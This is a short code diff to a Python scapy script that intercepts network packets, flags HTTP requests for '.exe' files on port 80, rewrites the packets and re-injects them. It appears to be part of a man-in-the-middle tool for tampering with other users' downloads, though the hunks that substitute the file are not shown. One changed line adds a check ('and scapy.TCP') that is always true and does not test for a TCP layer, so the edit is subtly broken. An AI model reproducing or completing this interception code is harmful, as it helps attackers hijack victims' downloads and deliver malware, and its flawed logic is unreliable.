@@ -8,7 +8,7 @@ ack_list = []
 
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
-    if scapy_packet.haslayer(scapy.Raw):
+    if scapy_packet.haslayer(scapy.Raw) and scapy.TCP:
         if scapy_packet[scapy.TCP].dport == 80:
             if '.exe' in str(scapy_packet[scapy.Raw].load):
                 print('[+] .exe request')
@@ -23,7 +23,7 @@ def process_packet(packet):
                 del scapy_packet[scapy.IP].len
                 del scapy_packet[scapy.IP].chksum
                 del scapy_packet[scapy.TCP].chksum
-                packet.set_payload(str(scapy_packet))
+                packet.set_payload(bytes(scapy_packet))
                 print(scapy_packet.show())
 
     packet.accept()
